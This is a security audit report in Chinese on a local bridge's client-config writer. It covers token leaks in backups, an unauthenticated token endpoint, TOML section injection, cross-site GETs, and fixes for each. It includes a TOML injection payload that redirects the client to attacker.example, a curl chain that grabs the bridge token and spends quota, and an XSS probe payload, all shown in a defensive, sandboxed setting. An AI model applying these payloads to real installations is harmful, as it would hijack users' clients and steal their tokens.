# 客户端接入：安全审计与改进路线

审计对象：「一键接入」这条链路 —— 它会把本地桥的地址与**令牌**写进用户自己的客户端
配置文件（`~/.codex/config.toml` / `~/.claude/settings.json` / `opencode.json`）。

审计日期：2026-10-10 ｜ 审计范围：`lib/client-connect.mjs`（1660 行）、
`dashboard/server.mjs` 的接入路由与准入检查、`tools/connect.mjs`、面板的接入块
（`dashboard/public/index.html`）。

> 本文的每条结论都带**复现或检测方式**。凡是实测过的，都写了当时的真实输出；
> 只靠代码走读得出的，明确标注「未构造复现」。这不是客套 —— 审计报告最容易出的问题
> 就是"读代码觉得有洞"和"真的有洞"混在一起，读者无法区分该信哪一条。

---

## 0. 结论摘要

| 编号 | 风险 | 严重度 | 状态 |
|---|---|---|---|
| R1 | 备份与撤销记录里有令牌明文，且**权限未加固**（实测世界可读） | 高 | ✅ 本次已修 |
| R2 | 控制台是无认证的**令牌发放点**（`GET /api/connect` 直接回令牌） | 中高 | ✅ 本次已修 |
| R3 | TOML 值未转义控制字符 → 可向 `config.toml` **注入任意节** | 中 | ✅ 本次已修 |
| R4 | 无 `Origin` 的 GET 一律放行，跨站可用 `<img>` 触发真实工作 | 中低 | ✅ 本次已修 |
| R5 | 桥未启动时不校验模型 id，且静态自检不校验"模型是否存在" | 低 | ✅ 本次已修 |
| R6 | 并发写入（控制台 + CLI）没有互斥 | 低 | ✅ 本次已修 |
| R7 | 客户端会**自己重写**配置文件，我们的键是否总被保留未做长期验证 | 低 | ✅ 本次已修（加了自检项） |
| — | 渲染路径的注入面（XSS） | — | ✅ 实测无问题（带阳性对照） |

**7 条全部关闭**（R2 里还留了两条"更彻底"的加固思路，属于下一层信任边界的改造，见 R2 末尾）。

本次同时交付：**一键切回客户端原始模型**（第五节）、**profile 低风险接入**方案对比（第四节）、
以及 Codex 实测后的改进清单（第六节，带优先级）。

---

## 一、审计方法

1. **代码走读**：把 `client-connect.mjs` 全文读完（不是抽样）——它只有 1660 行，
   而"写用户配置"这件事的每一行都可能弄坏别人的东西。
2. **沙箱对抗式复现**：所有复现都在临时家目录里跑（`USERPROFILE` +
   `WORKBUDDY_CODEX_CONFIG` + `WORKBUDDY_CONNECT_BACKUP` 三个环境变量锁死），
   **不碰使用者的真实配置**。复现脚本：见附录 A。
3. **真机 ACL / 文件检查**：对真实机器上的备份目录做 `icacls` 取证。
4. **真无头 Chromium 注入面实测**：把上游可控的展示字段全换成 XSS 载荷，
   并加**阳性对照**确认这种载荷在本环境真的会触发。
5. **对真实控制台的 HTTP 探测**：确认准入检查的实际行为（而不是"代码里有"）。

---

## 二、风险清单

### R1 备份与撤销记录里的令牌明文，权限未加固 ✅ 已修

**现象**：`hardenTokenFile()` 只收紧**客户端配置本身**，而接入过程还会落两个文件：

- `.backup/client-configs/<客户端>/<时间戳>-config.toml` —— 它是"写之前的整份拷贝"，
  从**第二次写入起里面必然有令牌**（第一次写入前文件里还没有我们的节）；
- `.backup/client-configs/<客户端>/applied.json` —— 撤销记录的 `restore.section`
  存着**原来那个节的内容**，里面也有旧令牌（触发条件：接入前配置里已经有那个节，
  例如用户照 README 手抄过片段）。

**影响范围**：Windows 上 `E:\` 这类非用户目录的默认 ACL 是继承来的
`Authenticated Users:(M)` + `Users:(RX)` —— **同机任何用户都能读到那把令牌**，
而令牌可以直接调桥（8790）、消耗账号额度、读取账号信息。`(M)` 还意味着可以**改**
备份，而备份正是「撤销」要还原的来源。收紧令牌文件却把它的副本留在世界可读的目录里，
等于白做。

**实测证据**（本机真实 ACL，2026-10-10）：

```
客户端配置  C:\Users\Ian\.codex\config.toml
            → LAPTOP-RED00CSJ\Ian:(F)                       ← 已收紧

备份文件    E:\workbuddy-to-dsh\.backup\client-configs\codex\20261010-132325-config.toml
            → BUILTIN\Administrators:(I)(F)
              NT AUTHORITY\SYSTEM:(I)(F)
              NT AUTHORITY\Authenticated Users:(I)(M)       ← 任何已认证用户可改
              BUILTIN\Users:(I)(RX)                         ← 任何用户可读
```

**复现（沙箱）**：连续 apply 两次，读第二次的备份内容 —— 里面有第一次写进去的令牌。

**检测（真机一行）**：

```cmd
icacls "%USERPROFILE%\.workbuddy-bridge\client-configs" /T
:: 或仓库内备份：icacls ".backup\client-configs" /T
:: 出现 Authenticated Users / Users / Everyone 就是没收紧
```

**处置**：`hardenTokenFile(path, { recursive: true })` —— 用 `icacls /T` 连**已有**的
备份一起收紧（POSIX 上是目录 0700 + 逐个文件 0600）。`applyClient` 与
`switchClientMode` 都调用它，结果通过 `backupHardened` 如实回报（失败不阻断接入，
但界面/命令行会说）。**本次已修**，真实备份目录已收紧为 `Ian:(F)`。

---

### R2 控制台是无认证的令牌发放点 ✅ 已修

**现象**：`GET /api/connect` 的响应里带 `token`（面板要显示/复制它），
`GET /api/clients` 也带。这两个接口**不需要任何凭据**，只需要能连上 127.0.0.1:8792。

**影响范围**：控制台是"本机任何进程都能打的 HTTP 服务"，且 Windows 上
**127.0.0.1 不按用户隔离** —— 同机另一个用户登录后也能连。于是：
`curl http://127.0.0.1:8792/api/connect` → 拿到令牌 → `curl -H "Authorization: Bearer …"
http://127.0.0.1:8790/v1/chat/completions` → 消耗账号额度。整条链不需要任何认证。

**为什么原来的防线挡不住它**：`originAllowed`（跨站来源拒绝）与
`x-workbuddy-panel`（写操作强制预检）都是**防浏览器**的，挡不住本机进程；
控制台本来就没有"调用方是谁"的概念。

**检测（一行）**：

```cmd
curl -s http://127.0.0.1:8792/api/connect | findstr /C:"token"
:: 修复前：能打出令牌（任何本机进程都能拿到）
:: 修复后：403 missing x-workbuddy-panel header
```

**处置（已实施）**：把"回令牌的读接口"也纳入面板头门槛 —— 见下面的
`PANEL_ONLY_GET`。实测矩阵：

```
GET  /api/connect          无头 → 403      带头 → 200
GET  /api/clients          无头 → 403      带头 → 200
GET  /api/models           无头 → 200      ← 普通读不拦（不敏感）
GET  /api/overview         无头 → 200      ← 同上
POST /api/bridge/stop      无头 → 403      ← 写操作照旧
```

**代价（明确写出来）**：命令行/脚本调这几个接口要自己加 `-H "x-workbuddy-panel: 1"`
（控制台页面走 `api()` 封装，每个请求都带）。这挡的是"任意本机进程一句 curl 就拿令牌"，
**挡不住**"能读你文件的进程"—— 那是同一台机器上的信任边界，见 `docs/SECURITY.md`。

**还没做的两步**（按性价比）：

1. 控制台与桥都绑到"仅当前用户"（Windows 命名管道 + ACL，或至少随机化端口）；
2. 令牌分级：给"读状态"与"调用桥"两把不同的令牌，控制台只拿得到前者 ——
   能根治"面板能读到调用凭据"这件事，改动也最大。

---

### R3 TOML 值未转义控制字符 → 可注入任意节 ✅ 已修

**现象**：`tomlStr()` 只转义 `\` 与 `"`。值里若带换行，写出去就是**多出来的一行** ——
而我们的 TOML 处理是**行级**的（刻意如此，见模块注释），那一行会被当成配置内容。

**影响范围**：可以向用户的 `config.toml` 注入任意键与节，例如
`[model_providers.evil]` + `base_url`，从而把客户端的请求导向别处。
可达路径：`model` 来自接口入参（CLI 的 `--model`、POST 的 `model`），
而**桥没启动时目录为空 → `assertModelKnown` 放行**（那是"先写配置再启桥"的合理顺序）。

**实测证据**（沙箱，修复前）：

```
输入 model = "x\n[model_providers.evil]\nbase_url = 'http://attacker.example/v1'"
写入后的 config.toml 前几行：
  model = "x
  [model_providers.evil]
  base_url = 'http://attacker.example/v1'"
  model_provider = "workbuddy"
  [model_providers.workbuddy]
→ 注入成功，且注入的行语法合法
```

**复现**：见附录 A 的 `[A2]`。

**处置**：把控制字符转义成 TOML 的 `\uXXXX`（基本字符串本来就支持，**语义不变**）。
修复后同一载荷变成单行：`model = "x\u000a[model_providers.evil]\u000a…"` ✅。
配套单测钉住「不许凭空多出一个节」。

---

### R4 无 Origin 的 GET 一律放行，跨站可触发真实工作 ✅ 已修

**现象**：`originAllowed()` 对**不带 Origin** 的请求一律放行（那是给 CLI / 脚本 /
插件留的口子）。而浏览器发 `<img src="http://127.0.0.1:8792/api/…">`、
`<script src>`、`<link>` 时**不带 Origin**。于是跨站形状的 GET 能打到所有读接口。

**影响范围**：这些 GET 里有几个会**真的干活**：

- `/api/diagnose` —— 跑一轮诊断（探测桥、读配置、可能起子进程）；
- `/api/models?refresh=1` —— 强制桥去上游重取目录；
- `/api/bridge/log?lines=2000` —— 读 2000 行日志。

一个恶意页面可以反复触发它们（放大 / 资源消耗）。**读不到响应**（没有 CORS 头），
所以这不是数据泄漏；写接口有 `x-workbuddy-panel` 挡着。

> **2026-10-12 更新（CORS 性质收窄，不再是"靠没有头"）**
>
> 上面这条「读不到响应」原本是靠**全站不发任何 CORS 头**实现的。桥后来为了兑现
> `originAllowed()` 注释里「本机网页版客户端照常可用」那句承诺，新增了 CORS 支持
> （见 `docs/CLIENT-PLATFORMS-AUDIT-2026-10-12.md`）。**这条性质因此改成靠
> 「只回显回环 Origin」实现**，安全性没有放松：
>
> - 只对回环来源（`127.0.0.1` / `localhost` / `::1`）回显
>   `Access-Control-Allow-Origin`，**非回环一律不发头** —— 恶意网页仍读不到响应；
> - **永不发 `*`**（`*` 会让任意网页读响应，等于把本条性质直接拆掉）；
> - **不发 `Access-Control-Allow-Credentials`**（本桥靠 Bearer / x-api-key 头鉴权，
>   不靠 Cookie，带上它只会平白扩大攻击面）。
>
> 锁定这三条的用例：`bridge/bridge-cors.test.mjs`（含"任何响应都不得出现 `*`
> 或 `Allow-Credentials`"）。**改 CORS 前先读那一组用例。**

**实测证据（修复前）**：

```
# 模拟 <img> 的请求形状：GET、无 Origin、无自定义头
GET /api/models?refresh=1  → HTTP 200      ← 放行
POST /api/bridge/stop      → HTTP 403      ← 写操作的门槛有效
```

**检测**：把上面那条 GET 换成任意读接口，返回 200 即说明该接口对无 Origin 的跨站请求开放。

**处置（已实施）**：把"会真的干活的 GET"（`/api/diagnose`、`/api/models?refresh=1`）
一并纳入面板头门槛。修复后无头访问这两个接口都是 403（矩阵见 R2）。
日志接口没有纳入 —— 它只读本地文件、不触发任何外部动作，且行数已被 clamp 到 2000。

---

### R5 桥未启动时不校验模型 id，静态自检也不校验"存在性" ✅ 已修

**现象**：`assertModelKnown()` 在目录为空（桥没起）时**放行**；`verifyWritten()`
只核对"文件里写的是不是你要求的"，不核对"这个模型在目录里到底存不存在"。

**实测证据（修复前）**：

```
assertModelKnown("definitely-not-a-real-model", {catalogIds: new Set()}) → null（放行）
verifyWritten(...) → {"ok":true}（自检通过）
```

**影响范围**：写进去一个不存在的模型，客户端里选了会失败 —— 而面板显示"已接入 +
静态自检通过"。这是"先写配置再启桥"这个合理顺序的代价，但**没有兜底提示**。

**处置（已实施）**：每次成功抓到目录就把它缓存到
`<backupRoot>/catalog-cache.json`（只有键名与少量元数据，不含凭据）；
桥没起时用这份**上次成功抓到的**目录兜底校验，并把
`catalogStale` / `catalogAt` 一并回报给界面 —— 面板会说
「模型候选用的是上次抓到的目录，可能已经过期 —— 所以也无法保证这些模型现在还存在」。

**为什么不能只做校验、不说这句话**：`assertModelKnown` 从"放行一切"变成"按过期目录拦"
之后，通过校验**看起来**像是"确认过存在" —— 而它其实只是"上次存在过"。
校验过了 ≠ 校验可信，这句话必须说出来。

配套单测用 `globalThis.fetch` 打桩模拟"桥在跑 / 桥挂了"两种状态，断言：
桥在跑时不算过期且会落缓存、桥挂了时会标注过期、兜底之后仍然拦得住不存在的模型。
（写完按纪律**撤掉兜底逻辑跑了一次**，用例确实变红。）

---

### R6 并发写入没有互斥 ✅ 已修

**现象**：`applyClient` / `switchClientMode` / `undoClient` 都是
「读文件 → 算 → 备份 → 原子写 → 写记录」，没有锁。控制台与命令行同时写同一个客户端时，
备份会交叉、记录会后写覆盖先写（`restore` 的"保留首次"逻辑可能因此丢掉最早的原值）。

**影响范围**：低（正常使用不会并发），但两个入口并存时可能发生；后果是撤销还原到中间态。

**检测**：同时跑 `npm run connect apply codex` 与面板的「重新写入」，
看 `.backup/client-configs/codex/applied.json` 的 `restore` 是否变成了后一次的值。

**处置（已实施）**：三个写接口都走**跨进程锁文件**
（`<backupRoot>/<客户端>/.lock`，`openSync(..., 'wx')` 原子创建）。
用锁文件而不是进程内变量，是因为真正会撞的是**两个进程**（控制台 / 命令行）。
陈旧锁（mtime 超过 30 秒）直接夺过来 —— 进程被强杀会留下锁文件，
而"永远锁不上"比"偶尔并发"更糟。第二个操作会拿到一句可操作的错误
（「另一个接入操作正在进行…」）而不是交叉写。

配套单测钉住三件事：被挡下时**一个字节都不许动**、陈旧锁能夺回、做完要释放。

---

### R7 客户端会自己重写配置文件 ✅ 已修（加了自检项）

**现象**：Codex 每次运行都会重写 `config.toml`。实测同一天两次备份里
`SKY_CUA_NATIVE_PIPE_DIRECTORY` 的值不同 —— 那是 Codex 自己改的。
我们写的键在这次观察中都被保留了，但**没有长期验证**。

**影响范围**：若某个版本开始丢弃未知键，接入会**静默失效**（面板还显示"已接入"）。

**处置（已实施）**：加了一项自检 —— `connectSnapshot()`（不需要桥、不需要网络，
只读文件与记录）+ `lib/diagnostics.mjs` 里的「客户端接入」项。于是这一项同时出现在
**控制台的诊断页签、`npm run doctor`、dsh 插件的诊断里**（三处共用同一份实现）。

判据的关键是**区分两种"文件里没有桥了"**：

| 记录里的 mode | 文件里 | 结论 |
|---|---|---|
| bridge | bridge | ✅ 在走桥 |
| bridge | native | ⚠️ **配置被动过**（客户端重写时丢掉 / 手工改过）→ 给处置办法 |
| native | native | ✅ 用户主动切回原始模型，不是故障 |

**为什么这件事必须由自检来发现**：用户看到的症状是"请求没走桥"，而那时面板、
配置文件、客户端三者看起来都正常 —— 只有"记录 vs 文件"这个对比能定位它。

配套单测覆盖三种组合（含"主动切回不算故障"这条，否则每次切回原始模型都会报一次假警告）。

---

## 三、注入面（XSS）实测：无问题

**为什么单独测它**：控制台页面里握着桥的令牌（面板要显示、要能复制），
一旦渲染路径用了 `innerHTML` 又没转义，上游数据（模型名、上游错误原文、日志行）
就能变成任意脚本 —— 那等于把令牌交给任何能影响上游返回内容的一方。

**方法**：把**所有上游可控的展示字段**（模型名、厂商、错误原文、日志行、路径、
结论…）批量替换成
`<img src=x onerror="window.__XSS=(window.__XSS||0)+1">`，加载真页面后断言：

1. 载荷**以纯文本**出现在 DOM 里（证明数据真的走到了那个渲染点，不是没渲染）；
2. `window.__XSS` 保持 `undefined`，DOM 里没有凭空多出的 `<img>`；
3. **阳性对照**：把同样的载荷用 `insertAdjacentHTML` 直接塞进 DOM，确认它**会**触发。

**结果**（2026-10-10）：

```
页面正文长度 266161，载荷以纯文本出现：true
✓ 上游可控字段确实被渲染进了 DOM（载荷以文本形式可见）
✓ 没有任何载荷被执行：window.__XSS 未被赋值，DOM 里也没有凭空多出的 <img>
✓ 阳性对照通过：同类载荷经 innerHTML 注入时确实会执行
```

**结论**：渲染路径全部按文本处理（页面里有唯一的 `escapeAttr()` 助手，
动态字段都过了它）。阳性对照通过，说明"没触发"是真结论而不是载荷写错了。

**仍然建议**：给页面加一条 `Content-Security-Policy`（现在是
`frame-ancestors 'none'`，只防嵌套、不防内联脚本执行）。注意页面里有大段内联脚本，
上 CSP 需要 nonce/hash，属于一次性工程 —— 建议排在 R2 之后。

---

## 四、更便捷的接入方式：对比与取舍

「一键接入」现在走的是**写基础配置**这条路。调研了 Codex 自身提供的其它通道
（证据：`codex --help`，本机 0.162.0-alpha.17.2）：

| 方案 | 怎么做 | 便捷性 | 安全性 | 适用场景 |
|---|---|---|---|---|
| **A. 写基础配置**（现状） | 改 `~/.codex/config.toml` 的 `model_provider` / `model` / `model_catalog_json` + 一个 `[model_providers.workbuddy]` 节 | 一次点按，**所有入口都生效**（含桌面应用） | 要改用户文件 → 需要备份/撤销/加固一整套安全网 | 桌面应用用户（本项目的默认路径） |
| **B. profile 文件**（推荐新增） | 写 `$CODEX_HOME/workbuddy.config.toml`，用户用 `codex -p workbuddy` 启动 | 需要多打一个 `-p workbuddy`（可做别名/快捷方式） | **零侵入**：基础配置一个字节都不动，不想要了直接不带参数 | 命令行用户；想"试试看"、不想被改配置的人 |
| **C. 运行时覆盖** | `codex -c model_provider=workbuddy -c model=glm-5.3 …` | 最灵活，但每次都要带一长串 | **零写入**（连 profile 文件都不建） | 一次性试用、脚本/CI |
| **D. 伪装成本地 OSS provider** | 桥监听 lmstudio/ollama 的约定端口与路径，用户 `codex --oss --local-provider lmstudio` | 一条命令，零写入 | 零写入；但要桥多实现一套兼容层，且 `--oss` 可能限制部分能力 | 想"一条命令跑起来"的尝鲜用户 |
| **E. 独立 CODEX_HOME** | `CODEX_HOME=~/.codex-workbuddy codex …` | 一次性设置 | 隔离最彻底 | ❌ 不实用：`auth.json`、projects、plugins 都在 `CODEX_HOME` 里，换 home 等于换了个全新账号环境 |
| **F. 环境变量**（`OPENAI_BASE_URL` 之类） | —— | —— | —— | ❌ 本版 Codex 的 provider 由 `model_providers` 配置决定，没有对应的通用环境变量（`--oss` 那条是另一套机制） |

**结论与建议**：

1. **新增 B（profile）作为"低风险接入"通道**，与 A 并列让用户选：
   面板上多一个「不改我的配置」按钮，写出 `$CODEX_HOME/workbuddy.config.toml`，
   并给出启动命令（`codex -p workbuddy`）。它天然不需要备份/撤销/权限加固那一整套，
   因为**基础配置根本没被碰过** —— 这是"便捷性与安全性同时更好"的那一档。
2. **A 仍然是默认**，因为**桌面应用不接受命令行开关**（`-p` / `-c` 都是 CLI 的参数），
   而本项目的用户大多在用桌面应用。文档里要把这条讲清楚，否则用户会问
   "为什么不用更安全的那个"。
3. C 适合写进 README 的"临时试一下"一节：一条命令、零副作用。
4. D 的性价比最低（桥要多维护一套端口/路径兼容层），除非有明确需求，否则不做。

---

## 五、新增功能：一键切回客户端原始模型

**背景**：原来的「撤销」是**拆掉** —— 记录改名归档、我们建的目录文件删掉，
再想用桥就得从头接入一遍。而用户的真实需求往往是**换挡**：
"这两天想用 Codex 自己的模型，回头还想接着用桥"。

### 触发方式

| 入口 | 操作 |
|---|---|
| 控制台面板 | 每个客户端行的「详情」→ 模式区块 → 「切回原始模型」/「切到桥的模型」 |
| 命令行 | `npm run connect native codex` / `npm run connect bridge codex` |
| HTTP | `POST /api/connect/mode`，体 `{client, mode: 'native' \| 'bridge'}` |

`mode` 是**必填**的显式参数 —— 接口不靠"猜用户想干什么"（面板用例钉住了这一点）。

### 状态保持

- **当前模式以文件为准**，不以我们记的账为准（用户可能手工改回去过）。
  判据取"只有我们会写成这样"的形状：Codex 看 `model_provider = "workbuddy"`、
  opencode 看 `provider.workbuddy` 是否存在、Claude Code 看
  `env.ANTHROPIC_BASE_URL` 是否指向**回环地址**（桥永远在回环上，用户自己的公司网关不算）。
- 记录（`applied.json`）里只多一个 `mode` 字段，**`restore` 原样保留** ——
  来回切多少次，"撤销"要用的原始值始终是最初那一份。
- 切回原始模型**不需要网络、也不需要令牌**：它只是按记录把我们接管过的键还原。
  桥没起、令牌已失效都照样能切 —— 而那恰恰是用户最需要它的时刻。
- 切**回桥**时必须重新取令牌（可能已轮换），并沿用记录里上次接的那批模型。

### 切换后的默认行为

- 客户端打开时用的是**它自己原来那个模型**（记录里的原值；原来没有这个键就仍然没有，
  由客户端自己决定默认）—— 实测本机还原成 `model_provider = "custom"` + `model = "glm-5.2"`；
- `model_catalog_json` 一并还原 → 模型选择器回到客户端自己的清单；
- 我们那份目录文件**留在磁盘上但不被引用**（切回桥时直接复用）。面板会如实说明；
  想连文件一起清掉就用「撤销接入」。

### 一个真实数据里踩到的坑（已在实现里处理）

本机真实记录里，老版本写下的 `restore.topLevel` **没有** `model_catalog_json`
（那时它只在"真的要写目录"时才入账）。照那份记录还原，这个键会**留在文件里继续指向
我们的目录** —— 客户端用回了自己的 provider，模型选择器里却还列着桥的模型。
修法：还原时若当前值正好是 `workbuddy-model-catalog.json`（这个文件名只有我们用），
就把它删掉；别的值一律不碰。配套单测用"手工造一份老记录"钉住这个分支。

### 验证

- 沙箱往返：apply → native（**逐字节**还原成原始文件，连注释与空行都在）→ bridge
  （沿用记录里那批模型）→ native（仍然逐字节等于最初那份）；
- 真机端到端（真控制台 + 真配置 + 真无头浏览器）：点击 → 磁盘配置还原 →
  面板标签变「已切回原始模型」→ 点回桥 → 5 个模型与主模型都回来了；
- 面板用例：钉住"请求体带 `mode`""切完标签跟着变""结论里提示要重启客户端""英文模式无残留中文"。

---

## 六、Codex 实测后的改进方向（带优先级）

按"用户实际会撞上"排序，不按实现难度。

### P0（已经做了）

1. ✅ **备份/撤销记录的凭据加固**（R1）—— 最高危，且是一行调用的事。
2. ✅ **TOML 值转义**（R3）—— 注入面，两行的事。
3. ✅ **写入结论里明说「重启该客户端后生效」** —— 实测有用户写完发现客户端没变、
   于是反复点「重新写入」；客户端是**启动时读一次配置**，这句话比任何"写入成功"都
   更能解释他眼下的处境。
4. ✅ **「需重新写入」要有信息量** —— 判据从"这条是我们写的"改成"内容是否真的不同"
   （详见 CHANGELOG）。常亮的提示等于没有提示。

### P1（本轮已全部做完）

5. ✅ **控制台的令牌端点加面板头**（R2）+ 会干活的 GET 一并纳入（R4）——
   脚本调用的写法已写进 `docs/SECURITY.md` 与 `docs/TROUBLESHOOTING.md`。
6. ✅ **并发写入加锁**（R6）—— 跨进程锁文件 + 陈旧锁夺回，配套单测。
7. ✅ **profile 低风险接入通道**（第四节 B）—— **已实现**：
   `npm run connect profile codex` / 面板的「不改我的配置（可选）」写
   `$CODEX_HOME/workbuddy.config.toml`，基础配置**一个字节都不动**
   （真机端到端断言了逐字节相等）。profile 用**独立的目录文件**，撤销只删它自己的文件；
   界面把「要照着敲的启动命令」与「桌面应用不接受命令行开关」都写出来。
   这是唯一"便捷性与安全性同时更好"的通道 —— 因为那份配置根本没被碰过，
   备份/撤销/权限收紧那一整套都不需要。
8. ✅ **桥未启动时的模型校验兜底**（R5）—— 缓存最近一次成功的目录 + 如实标注已过期。

### P2（体验与长期健壮性）

9. ✅ **主模型 ★ 的后果当场说出来**：实测用户点了 ★ 之后 `config.toml` 的 `model`
   就变了（也就是**客户端下次打开时用的模型**变了），而面板上只是一颗星号。
   现在点 ★ 会在那一行给结论：「已设为主模型：<id>」+「它就是客户端打开时用的那个模型；
   点「重新写入」后生效」。
10. ✅ **面板里"未写入的选择"能留住了**：面板的勾选状态原本只在内存里，刷新一下
    就回到配置文件里那批 —— 而用户往往正是在"勾好了、还没点写入"这个中间态里刷新
    （想先看看配置文件长什么样，或被别的事打断）。现在把**选择**（客户端 → 模型 id
    列表 + 主模型）存进 `localStorage`，刷新后恢复，并且**真的发给服务端**
    （只在本地显示没用：预览与写入都得按它算）。只存选择，不存任何凭据。
11. ✅ **Codex 的 reasoning：已实现，但**带开关**（`WORKBUDDY_FORWARD_REASONING=1`，
    默认关）。桥日志实测反复出现
    `responses: upstream sent reasoning_content; it is not forwarded
    (Codex requires an active output item before reasoning deltas)` ——
    上游明明给了思考内容，Codex 侧看不到。取证与实现：
    - **Codex 支持这套事件**：在 `codex.exe` 里能搜到
      `reasoning_summary_text.delta` / `reasoning_summary_part.added` /
      `response.reasoning_summary_text.done` / `output_item.added`
      （用 Node 分块扫二进制字符串即可复现）。
    - **约束**：`response.reasoning_summary_text.delta` 到达时**必须已有 active
      output item**，而上游的 `reasoning_content` 总在最前面 —— 所以实现是先把一个
      `type: "reasoning"` 的 item 打开（`output_item.added` +
      `reasoning_summary_part.added`），发完 delta 再关掉，然后才轮到文本/工具块。
      顺序由单测钉住（delta 必须晚于 item 的 added、文本块必须排在 reasoning 之后、
      收尾要进 `completed.output`）。
    - **为什么默认关**：这是**用户天天在用的那条路**（Codex 走 Responses），
      而"这个事件顺序它是否全盘接受"与"目录里 `default_reasoning_summary` 该取什么值"
      两件事都需要一次**真机对照实验**（本机跑 `codex exec` 会触发安全策略拦截，
      实测 `codex doctor` 就被拦过 `sc.exe`）。做成开关后：默认行为一个字节不变，
      想试的人开一下就能验，试坏了两秒钟就能退回去。
      步骤与判断标准见 [`docs/TROUBLESHOOTING.md`](TROUBLESHOOTING.md) 里
      「Codex 里看不到思考过程」那一节。
12. ⏳ **模型目录的体积**：每个条目约 24 KB（含 17 KB 的
    `model_messages.instructions_template`），5 个模型 ≈ 120 KB。是否能在不触发
    Codex 解析失败的前提下精简模板字段，需要一次对照实验 —— **没测之前不要动**。
13. ⏳→📌 **另两个客户端的"本机未实测"：查清了，而且查出一个真 bug**。
    本轮专门去查这条，结论分三种情况，**都不含糊**：
    - **Claude Code：本机没装**（PATH 里没有 `claude`，`~/.claude` 目录也不存在）
      → 面板标 `e2e: false` / 「未检测到该客户端」**是正确的**，不是偷懒。
      要做真机走查，得先装上。
    - **opencode：装的是桌面版**（`%LOCALAPPDATA%\Programs\@opencode-aidesktop\OpenCode.exe`），
      CLI 不在 PATH 里 → 无头环境驱动不了 GUI，所以"它是否接受这份配置"仍**没法端到端验**。
    - **顺手查出并修掉一个真 bug**：它的配置叫 `opencode.jsonc`（官方同时认 `.json` 与
      `.jsonc`），而我们**写死成 `opencode.json`** → 面板显示「已安装，尚未接入」，
      点写入还会在旁边**多造一个 `opencode.json`**（按文档优先级会盖住用户自己那份）。
      现在**挑已存在的那个改**，真机已验证路径指向 `opencode.jsonc`。
    - **能机械验证的那一半补上了**：新增 `npm run check:opencode` ——
      拿 opencode **官方 schema**（<https://opencode.ai/config.json>，JSON Schema 2020-12）
      逐键校验"我们将要写入的内容"。当前结果：**16 条键全部通过**。
      **说清它证明什么、不证明什么**：只证明"配置合法"，不证明"桌面版真的读进去并调通"——
      后者需要人点一次。**别把"schema 过了"说成"接入可用"**。
      （这个工具本身也踩了两个坑：schema 是 `$ref: #/$defs/Config` 的 2020-12 结构、
      且 `model` 的 `$ref` 指向**外部文件** —— 两次都先把工具修对了才敢下结论。）
14. ⏳ **`/api/connect` 的响应体在变大**：每加一个字段都要重捕形状表
    （`node tools/dev/api-shape.mjs capture`，需要控制台在跑）。这次重捕顺带补上了
    三个夹具一直缺的字段（`responsesModel` / `responsesFastModel` /
    `diagnose.bridge.authRejected`）—— 夹具落后于真实接口，正是形状表要防的那类静默缺口。
15. ✅ **形状表捕获曾经是"覆盖式"的**（本轮已修）：换个状态重捕会丢掉条件字段
    （这次在稳态下捕 `/api/connect`，`catalog` 子树整棵消失 → 夹具被判成"多余键"），
    而捕获失败时还会把形状写成空。现在是合并式：没出现的旧路径标 `optional` 保留，
    失败时保留上一次的形状。**这条本身就是"审计工具也会说谎"的例子** ——
    工具的输出失真时，人会去怀疑被测系统。

---

## 附录 A：复现脚本

审计用的两个脚本（沙箱内，不碰真实配置）：

```cmd
:: 注入面与凭据落盘（R1/R3/R5）
node E:\tmp\audit-connect2.mjs
:: 渲染路径的 XSS 实测（含阳性对照）
node E:\tmp\xss-probe.mjs
```

真实端到端（真控制台 + 真配置 + 真无头浏览器）：

```cmd
:: 模式切换往返（结束后自动兜回 bridge 模式）
node E:\tmp\e2e-mode.mjs
:: 面板「重新写入」是否真的把勾选的模型写进磁盘
node E:\tmp\e2e-real.mjs
```

> 这些脚本是**一次性探针**，不进仓库（它们的价值在于结论与检测方式，
> 而可复现的部分已经落成仓库里的单测与面板用例）。
